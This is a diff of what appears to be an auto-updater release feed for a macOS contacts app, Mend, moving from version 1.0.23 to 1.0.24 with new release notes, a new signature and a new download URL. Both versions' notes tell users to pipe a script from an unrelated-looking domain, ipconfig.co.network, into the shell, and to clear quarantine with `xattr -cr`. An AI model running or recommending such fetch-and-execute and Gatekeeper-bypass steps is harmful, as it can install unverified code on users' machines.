@@ -1,14 +1,14 @@
 {
-  "version": "1.0.23",
-  "notes": "## Mend 1.0.23 — 07 Nov 2026\n\n- **Duplicates are cards that share a mobile number, and nothing else.** A matching name, a shared email, a shared office line, a fax or a pager no longer makes two cards one person. Whether a number is a mobile comes from its label (mobile, cell, iPhone), or else from Google's numbering rules.\n- **A better Duplicates tab.** Each group shows the mobile number its cards share. Click a card to keep its name and photo; it's marked \"keep\". **Preview** shows the merged card before you merge, including the note listing every card. **Not the same person** keeps a group apart for good (there is a way to show them again). A search box finds a group by name or number. **Undo** puts the last merge back into separate cards.\n- **Merge all saves in one go.** On big lists it no longer saves group by group, which froze the window, and it says how many people and cards it merged.\n\n### Install\n\n- **macOS on Apple silicon** (M1 and newer): `curl -fsSL https://ipconfig.co.network/pour/install | sh` then `pour install --cask mend`\n\nFirst launch on macOS after a manual DMG install: `xattr -cr /Applications/Mend.app` (Mend is ad-hoc signed, not notarized).",
-  "pub_date": "2026-11-07T09:37:56Z",
+  "version": "1.0.24",
+  "notes": "## Mend 1.0.24 — 07 Nov 2026\n\n- **Delete contacts one by one, picked, or all at once, including from iCloud.** The contact list has **Select**: tick contacts (or **All**), then **Delete N**; or **Delete all**, which asks you to type DELETE. Before anything is deleted, a copy of those contacts goes into a Mend library book (\"Deleted from … (date time)\"), so Copy & move can put them back. iCloud contacts are deleted six at a time with a progress bar. One changed on another device since Mend read it is still deleted, because you asked for it gone. Any that can't be deleted are counted and named, and stay; the rest are gone.\n\n### Install\n\n- **macOS on Apple silicon** (M1 and newer): `curl -fsSL https://ipconfig.co.network/pour/install | sh` then `pour install --cask mend`\n\nFirst launch on macOS after a manual DMG install: `xattr -cr /Applications/Mend.app` (Mend is ad-hoc signed, not notarized).",
+  "pub_date": "2026-11-07T09:57:57Z",
   "platforms": {
     "darwin-aarch64": {
-      "signature": "dW50cnVzdGVkIGNvbW1lbnQ6IHNpZ25hdHVyZSBmcm9tIHRhdXJpIHNlY3JldCBrZXkKUlVUSUVLMDNkb2V5SDFxS3RjZnpOOG5PT25jTjFZTys3ZVFxOXY3OURNSUpHd1pLWm0rNnFUdEJ6N2tPYXRlRE1EV3FjMDlaYTVFSHRrRFlBSGV1Z0MvUGhlbENjMnZGMHdBPQp0cnVzdGVkIGNvbW1lbnQ6IHRpbWVzdGFtcDoxNzk0MDQ0MjMwCWZpbGU6TWVuZC5hcHAudGFyLmd6CXZlcnNpb246MS4wLjIzCmx1WFNBbHNKcHRwTDhCZTdkMm4wM2JTZE8xNEx1QXRuTW44NkswdHRTT00wWjE5aUo1Y1VHdlhQbS9kRThUNkZYUk56ZURMWWtXQ1VIQlhJRjByMEF3PT0K",
-      "url": "https://github.com/JKS-sys/mend-08-oct-2026-releases/releases/download/v1.0.23/Mend_aarch64.app.tar.gz"
+      "signature": "dW50cnVzdGVkIGNvbW1lbnQ6IHNpZ25hdHVyZSBmcm9tIHRhdXJpIHNlY3JldCBrZXkKUlVUSUVLMDNkb2V5SDNMdEFaMnBWNkVtSk9TemVhOU96bHBZUnFPKzBsU1ZTVENUSGZxT0VTa3daTnROMFVkZmV4bml0R0FRdHhFaVdITWxQd2VJbTRvOFd3UklpSUZ5RlF3PQp0cnVzdGVkIGNvbW1lbnQ6IHRpbWVzdGFtcDoxNzk0MDQ1NDQzCWZpbGU6TWVuZC5hcHAudGFyLmd6CXZlcnNpb246MS4wLjI0ClI0UitqZW1tY3NEdTRoTDJsKzlnSjZVa2pnWG5iSjdENkpjdnQyVzgvbnJrcVNZQUVHOWwxUk5XRjFPbHpBOVlONnlVNlVlMzQ0SElYVkt0clo1Q0JBPT0K",
+      "url": "https://github.com/JKS-sys/mend-08-oct-2026-releases/releases/download/v1.0.24/Mend_aarch64.app.tar.gz"
     }
   },
   "downloads": {
-    "mac_arm": "Mend_1.0.23_aarch64.dmg"
+    "mac_arm": "Mend_1.0.24_aarch64.dmg"
   }
 }
